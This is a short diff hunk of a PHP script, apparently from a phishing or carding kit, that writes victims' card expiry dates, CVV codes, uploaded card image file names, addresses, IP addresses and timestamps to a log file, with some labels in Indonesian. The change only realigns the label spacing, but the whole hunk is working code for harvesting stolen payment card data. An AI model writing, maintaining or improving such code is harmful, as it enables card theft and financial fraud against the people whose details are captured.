@@ -52,43 +52,43 @@ fwrite($handle, "Exp Date	: ");
 fwrite($handle, "$mm");
 fwrite($handle, "/");
 fwrite($handle, "$yy");
-fwrite($handle, " CVV		:");
+fwrite($handle, " CVV : ");
 fwrite($handle, "$cv");
 
 fwrite($handle, "\n");
-fwrite($handle, "Card 1 : ");
+fwrite($handle, "Card 1   : ");
 fwrite($handle, "$file_name");
 
 fwrite($handle, "\n");
-fwrite($handle, "Card 2 : ");
+fwrite($handle, "Card 2   : ");
 fwrite($handle, "$file_name1");
 
 
 fwrite($handle, "\n");
-fwrite($handle, "Alamat : ");
+fwrite($handle, "Alamat   : ");
 fwrite($handle, "$a1");
 fwrite($handle, "\n");
-fwrite($handle, "Alamat : ");
+fwrite($handle, "Alamat   : ");
 fwrite($handle, "$a2");
 fwrite($handle, "\n");
 
-fwrite($handle, "City   : ");
+fwrite($handle, "City     : ");
 fwrite($handle, "$cty");
 fwrite($handle, "\n");
-fwrite($handle, "State  : ");
+fwrite($handle, "State    : ");
 fwrite($handle, "$st");
 fwrite($handle, "\n");
-fwrite($handle, "Zip    : ");
+fwrite($handle, "Zip      : ");
 fwrite($handle, "$zi");
 fwrite($handle, "\n");
-fwrite($handle, "Country: ");
+fwrite($handle, "Country  : ");
 fwrite($handle, "$cr");
 fwrite($handle, "\n");
 
-fwrite($handle, "IP     : ");
+fwrite($handle, "IP       : ");
 fwrite($handle, "$alamat");
 fwrite($handle, "\n");
-fwrite($handle, "Waktu  : ");
+fwrite($handle, "Waktu    : ");
 fwrite($handle, "$waktu");
 fwrite($handle, "\n");
 fwrite($handle, "\n");
